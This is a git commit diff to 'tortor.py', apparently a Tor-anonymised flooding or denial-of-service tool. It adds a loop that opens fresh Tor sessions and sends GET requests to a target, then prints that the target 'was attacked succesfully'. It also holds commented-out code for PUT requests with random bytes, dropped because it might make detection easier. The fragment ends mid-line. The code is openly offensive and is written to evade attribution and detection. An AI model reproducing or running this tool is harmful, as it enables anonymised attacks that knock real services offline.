dcbb55b0e30afb39c99c86aae7c2a334c76f495c
elmiya0711 <elmiya0711@gmail.com>
2026-05-15 13:35:15 +0700

    update

--- tortor.py
+++ tortor.py
@@ -22,3 +22,21 @@ def main():
                 session = tor.new_session(proxies={'http': proxy, 'https': proxy})
                 print('{}[!]{} New Tor session initialized...'.format(color.BLUE, color.END))
                 print('\n{}[+]{} Target: {}{}{}'.format(color.PURPLE, color.END, color.PURPLE, target, color.END))
+                                # Getting data from the server
+                print('{}[*]{} Getting data from {}...'.format(color.ORANGE, color.END, target))
+                session.get(target)
+                # Putting data (omitted, maybe it makes detection easier)
+                # random_bytes = random._urandom(1490)
+                # print('{}[*]{} Putting data on {}...'.format(color.ORANGE, color.END, target))
+                # session.put(target, random_bytes)
+                print('{}[*]{} Target {} was attacked succesfully'.format(color.ORANGE, color.END, target))
+    except KeyboardInterrupt:
+        pass
+    except Exception as exception:
+        print('\n{}[!]{} An error has occurred:'.format(color.RED, color.END))
+        print('{}{}{}'.format(color.RED, exception, color.END))
+    finally:
+        end_time = datetime.datetime.now().time().strftime('%H:%M:%S')
+        total_time = (datetime.datetime.strptime(end_time, '%H:%M:%S') - datetime.datetime.strptime(start_time, '%H:%M:%S'))
+        print('{}[+]{} Time elapsed:\t{}'.format(color.GREEN, color.END, total_time))
+        print('{}
